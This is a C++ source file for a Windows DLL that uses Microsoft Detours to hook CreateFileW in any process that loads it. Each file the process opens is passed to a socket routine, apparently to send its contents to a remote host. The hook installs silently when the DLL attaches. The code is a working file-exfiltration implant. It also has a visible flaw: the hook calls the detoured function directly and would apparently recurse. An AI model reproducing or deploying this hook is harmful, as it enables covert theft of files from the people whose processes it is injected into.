#pragma comment(lib, "detoured.lib")
#pragma comment(lib, "detours.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "User32.lib")

#undef UNICODE
#include <cstdio>
#include <Winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include "detours.h"
#include "../Utils/Socket.h"

static HANDLE (WINAPI * TrueCreateFile)
(
 LPCWSTR lpFileName,
 DWORD dwDesiredAccess,
 DWORD dwShareMode,
 LPSECURITY_ATTRIBUTES lpSecurityAttributes,
 DWORD dwCreationDisposition,
 DWORD dwFlagsAndAttributes,
 HANDLE hTemplateFile
 ) = CreateFileW;

HANDLE WINAPI TransCreateFile
(
 LPCWSTR lpFileName,
 DWORD dwDesiredAccess,
 DWORD dwShareMode,
 LPSECURITY_ATTRIBUTES lpSecurityAttributes,
 DWORD dwCreationDisposition,
 DWORD dwFlagsAndAttributes,
 HANDLE hTemplateFile
 )
{
	//MessageBox(NULL, "lala", "lala", MB_OK);

 	socket_utils::SendFile(lpFileName);

    return CreateFileW(
        lpFileName,
        dwDesiredAccess,
        dwShareMode,
        lpSecurityAttributes,
        dwCreationDisposition,
        dwFlagsAndAttributes,
        hTemplateFile);
};


BOOL WINAPI DllMain(HMODULE hDLL, DWORD Reason, LPVOID Reserved)
{
	switch(Reason)
	{
	case DLL_PROCESS_ATTACH:	//Do standard detouring
		DisableThreadLibraryCalls(hDLL);
		DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());
		DetourAttach(&(PVOID&)TrueCreateFile, TransCreateFile);
		if(DetourTransactionCommit() == NO_ERROR)
			OutputDebugString("CreateFileW detoured successfully");
		break;
	case DLL_PROCESS_DETACH:
		DetourTransactionBegin();	//Detach
        DetourUpdateThread(GetCurrentThread());
		DetourDetach(&(PVOID&)TrueCreateFile, TransCreateFile);
		DetourTransactionCommit();
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return TRUE;
}